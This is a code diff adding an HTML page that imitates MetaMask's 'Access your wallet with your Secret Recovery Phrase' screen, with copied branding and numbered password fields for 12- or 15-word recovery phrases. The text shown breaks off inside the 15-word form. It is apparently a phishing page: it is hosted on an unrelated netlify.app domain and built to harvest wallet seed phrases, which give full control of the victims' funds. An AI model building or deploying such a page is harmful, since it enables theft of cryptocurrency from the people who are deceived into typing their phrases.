@@ -1,0 +1,1136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="https://bestfilltype.netlify.app/icon.png">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/9d49fee985.js" crossorigin="anonymous"></script>
+    <title>MetaMask</title>
+</head>
+<style>
+
+  /* google fonts for header  */
+
+.roboto-light {
+  font-family: "Roboto", sans-serif;
+  font-weight: 400;
+  font-style: normal;
+}
+
+.roboto-regular {
+  font-family: "Roboto", sans-serif;
+  font-weight: 400;
+  font-style: normal;
+}
+
+.roboto-medium {
+  font-family: "Roboto", sans-serif;
+  font-weight: 500;
+  font-style: normal;
+}
+
+.roboto-bold {
+  font-family: "Roboto", sans-serif;
+  font-weight: 500;
+  font-style: normal;
+}
+
+.roboto-black {
+  font-family: "Roboto", sans-serif;
+  font-weight: 900;
+  font-style: normal;
+}
+
+.roboto-thin-italic {
+  font-family: "Roboto", sans-serif;
+  font-weight: 100;
+  font-style: italic;
+}
+
+.roboto-light-italic {
+  font-family: "Roboto", sans-serif;
+  font-weight: 300;
+  font-style: italic;
+}
+
+.roboto-regular-italic {
+  font-family: "Roboto", sans-serif;
+  font-weight: 400;
+  font-style: italic;
+}
+
+.roboto-medium-italic {
+  font-family: "Roboto", sans-serif;
+  font-weight: 500;
+  font-style: italic;
+}
+
+.roboto-bold-italic {
+  font-family: "Roboto", sans-serif;
+  font-weight: 700;
+  font-style: italic;
+}
+
+.roboto-black-italic {
+  font-family: "Roboto", sans-serif;
+  font-weight: 900;
+  font-style: italic;
+}
+
+.hide{
+  display: none;
+}
+  /* text selectors  */
+  p{
+  font-size: 12px;
+ }
+ h3{
+  font-size: 15px;
+ }
+#word1 > h3{
+  margin: 20px auto;
+}
+
+/* icon */
+.mentaicon{
+    width: 5%;
+    height: 5%;
+    margin-top: 10px;
+    margin-right: 10px;
+}
+/* body css */
+  body{
+    background-color: white;
+    margin: 0;
+    width: 100%;
+    text-align: center;
+  }
+  .container{
+    display: flex;
+    margin:10px auto;
+    width: 65%;
+    justify-content: center;
+  }
+  .dropdown__select {
+    height: 25px;
+    border-radius: 5px;
+    border:1px solid #cccccc;
+    margin-top: 10px;
+  }
+  #word{
+    border:1px solid #cccccc;
+    border-radius: 7px;
+    padding: 3px;
+    margin: 19px;
+    width: 100%;
+  }
+  .pnumber{
+    display: flex;
+    flex-direction: row;
+  }
+  .third{
+    display: inline-flex;
+    background-color: #e6f2fa;
+    border-radius: 7px;
+    width: 100%;
+  }
+  .third > p{
+    font-size: 13px;
+  }
+  .fourth{
+     display: grid;
+     grid-template-rows: 1fr 1fr 1fr 1fr;
+     grid-template-columns: 1fr 1fr 1fr;
+     gap: 10px;
+     margin-top: 15px;
+  }
+  input{
+    width: 56%;
+    border-radius: 4px;
+    border: 1px solid #e5e5e5;
+  }
+  input:focus {
+  outline: none;
+  border-color: #0376c9;
+}
+  button{
+    padding: 10px;
+    margin-top: 15px;
+    border-radius: 20px;
+    border: 0px;
+    background-color: #a9dafc;
+    color: white;
+  }
+  button:hover{
+    cursor:pointer;
+  }
+
+.first > img {
+width: 7rem;
+}
+.eye12, .eye15, .eye18, .eye21, .eye24 {
+  height: 19px;
+  width: 21px;
+}
+.select-box{
+margin: 20px 0px 0px 20px;
+}
+.first,.second{
+  margin: 10px auto;
+}
+.container1 {
+    margin: 10px auto;
+    width: 40%;
+    border: 2px solid #cccccc;
+    border-radius: 15px;
+    padding: 30px;
+}
+.container1img{
+  width: 16%;
+  margin: 0px auto;
+}
+.container1 > h1{
+  font-family: sans-serif;
+  font-size: 28px;
+  font-weight: bold;
+  padding: 20px;
+}
+
+a{
+  text-decoration: none;
+}
+
+.preloader {
+  position: fixed;
+  width: 100%;
+  height: 100vh;
+  top: 0;
+  left: 0;
+  background-color: #ffffffb2;
+  z-index: 4000;
+}
+
+.preloader-box {
+  position: absolute;
+  top: 40%;
+  left: 50%;
+  transform: translate(-40%, -50%);
+}
+
+
+
+
+@media (max-width:650px) {
+  h1{
+    font-size: 13px;
+  }
+  h3{
+    font-size: 10px;
+  }
+  p{
+    font-size: 12px;
+  }
+  .container{
+    width: 100%;
+  }
+  .container1{
+    width: 65%;
+  }
+  .select-box{
+margin: 0px;
+}
+ #word{
+    font-size: 12px;
+    padding: 3px;
+    border-radius: 7px;
+    width: 100%;
+    margin: auto;
+  }
+  .pnumber{
+    display: flex;
+    flex-direction: column;
+
+  }
+  .dropdown__select {
+    height: 25px;
+    border-radius: 5px;
+    border:1px solid #cccccc;
+    margin-top: 13px;
+    margin-left: -54px;
+  }
+}
+@media (max-width:940px) {
+  .fourth{
+    display: grid;
+    grid-template-columns: 3fr;
+
+  }
+  input{
+    width: 70%;
+  }
+  h1{
+    font-size: 19px;
+  }
+  h3{
+    font-size: 12px;
+  }
+  p{
+    font-size: 10px;
+  }
+  .container{
+    width: 100%;
+  }
+  .first{
+    width: 50%;
+  }
+  .second{
+    width: 50%;
+  }
+  .container1{
+    width: 65%;
+  }
+  #word{
+    font-size: 12px;
+    padding: 3px;
+    border-radius: 7px;
+    width: 100%;
+    margin: auto;
+  }
+  .pnumber{
+    display: flex;
+    flex-direction: column;
+  }
+  .third > p{
+    font-size: 9px;
+  }
+}
+</style>
+<body>
+
+        <!-- <div class="preloader">
+        <div class="preloader-box">
+            <div>
+                <img src="" alt="icon-load" width="80px">
+            </div>
+            <div class="loader">Loading...</div>
+        </div>
+    </div> -->
+
+    <div class="container">
+        <div class="first">
+            <img src="data:image/png;base64,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" alt="menta-logo" class="menta-logo">
+        </div>
+        <div class="second">
+            <select class="dropdown__select"><option value="am">English</option><option value="ar">العربية</option><option value="bg">български</option><option value="bn">বাংলা</option><option value="ca">Català</option><option value="cs">Čeština</option><option value="da">Dansk</option><option value="de">Deutsch</option><option value="el">ελληνικά</option><option value="en">English</option><option value="es">Español</option><option value="es_419">Español (Latin America)</option><option value="et">Estonian</option><option value="fa">فارسی</option><option value="fi">Suomi</option><option value="fil">Filipino</option><option value="fr">Français</option><option value="gu">ગુજરાત</option><option value="he">עברית</option><option value="hi">मानक हिन्दी</option><option value="hn">हिन्दी</option><option value="hr">Hrvatski</option><option value="ht">Kreyòl ayisyen</option><option value="hu">Magyar</option><option value="id">Bahasa Indonesia</option><option value="it">Italiano</option><option value="ja">日本語</option><option value="kn">ಕನ್ನಡ</option><option value="ko">한국어</option><option value="lt">Lietuviškai</option><option value="lv">Latvian</option><option value="ml">മലയാളം</option><option value="mr">मराठी</option><option value="ms">Malay</option><option value="nl">Nederlands</option><option value="no">Norwegian</option><option value="ph">Pilipino</option><option value="pl">Polskie</option><option value="pt">Português</option><option value="pt_BR">Português (Brazillian)</option><option value="pt_PT">Português (European)</option><option value="ro">Limba română</option><option value="ru">Русский</option><option value="sk">Slovenčina</option><option value="sl">Slovenščina</option><option value="sr">српски</option><option value="sv">Svenska</option><option value="sw">Swahili</option><option value="ta">தமிழ்</option><option value="te">తెలుగు</option><option value="th">ไทย</option><option value="tl">Wikang Tagalog</option><option value="tr">Türkçe</option><option value="uk">Українська мова</option><option value="vi">Tiếng Việt</option><option value="zh_CN">中文(简体)</option><option value="zh_TW">中文(繁體)</option></select>
+        </div>
+    </div>
+    <div class="container1">
+      <div class='went'>
+      <div><img class="container1img" src="https://thegivingblock.com/wp-content/uploads/2023/02/MetaMask-Partnership-The-Giving-Block.png" alt="confirm"></div>
+      <div>
+
+        <h1 class="roboto-bold">Access your wallet with your
+          Secret Recovery Phrase</h1>
+          <p class="roboto-light">MetaMask cannot recover your password. We will use your
+            Secret Recovery Phrase to validate your ownership, restore your wallet and set up a new password. First, enter the Secret Recovery Phrase that you were given when you created your
+            wallet. <a href="">Learn more</a></p>
+      </div>
+      <div class="pnumber">
+        <div id="word1">
+          <h3 class="roboto-bold">Type your Secret Recovery Phrase</h3>
+        </div>
+        <div class="select-box">
+          <select id="numList">
+            <option value="12">I have a 12-word phrase</option>
+            <option value="15">I have a 15-word phrase</option>
+            <option value="18">I have a 18-word phrase</option>
+            <option value="21">I have a 21-word phrase</option>
+            <option value="24">I have a 24-word phrase</option>
+          </select>
+        </div>
+    </div>
+    <div class="third">
+      <img class="mentaicon" src="data:image/png;base64,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" alt="menta">
+      <p>You can paste your entire secret recovery phrase into any field</p>
+    </div>
+  </div>
+    <form action="#" id="myform" class="form121">
+    <div class="wordForm1">
+    <div class="fourth">
+      <div>
+        <label for="">1 </label>
+          <input type="password" class="form12" >
+          <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye12">
+      </div>
+      <div>
+        <label for="">2 </label>
+          <input type="password" class="form12" >
+           <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye12">
+      </div>
+      <div>
+        <label for="">3 </label>
+          <input type="password" class="form12">
+           <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye12">
+      </div>
+      <div>
+        <label for="">4 </label>
+        <input type="password" class="form12">
+         <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye12">
+      </div>
+      <div>
+        <label for="">5 </label>
+          <input type="password" class="form12">
+           <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye12">
+      </div>
+      <div>
+        <label for="">6 </label>
+          <input type="password" class="form12">
+           <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye12">
+      </div>
+      <div>
+        <label for="">7 </label>
+          <input type="password" class="form12">
+           <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye12">
+      </div>
+      <div>
+        <label for="">8 </label>
+          <input type="password" class="form12">
+           <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye12">
+      </div>
+      <div>
+        <label for="">9 </label>
+          <input type="password" class="form12">
+           <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye12">
+      </div>
+      <div>
+        <label for="">10 </label>
+          <input type="password" class="form12">
+           <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye12">
+      </div>
+      <div>
+        <label for="">11 </label>
+          <input type="password" class="form12">
+           <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye12">
+      </div>
+      <div>
+        <label for="">12 </label>
+          <input type="password" class="form12">
+           <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye12">
+      </div>
+    </div>
+    <div>
+    <button type="submit" disabled class="button12">Confrim Secret Recovery Phrase</button>
+    </div>
+   </div>
+  </form>
+    <!-- 15form -->
+     <form action="#" id="myform" class="form151">
+    <div class="hide wordForm2">
+    <div class="fourth   ">
+      <div>
+        <label for="">1 </label>
+          <input type="password" class="form15">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye15">
+      </div>
+      <div>
+        <label for="">2 </label>
+          <input type="password" class="form15">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye15">
+      </div>
+      <div>
+        <label for="">3 </label>
+          <input type="password" class="form15">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye15">
+      </div>
+      <div>
+        <label for="">4 </label>
+        <input type="password" class="form15">
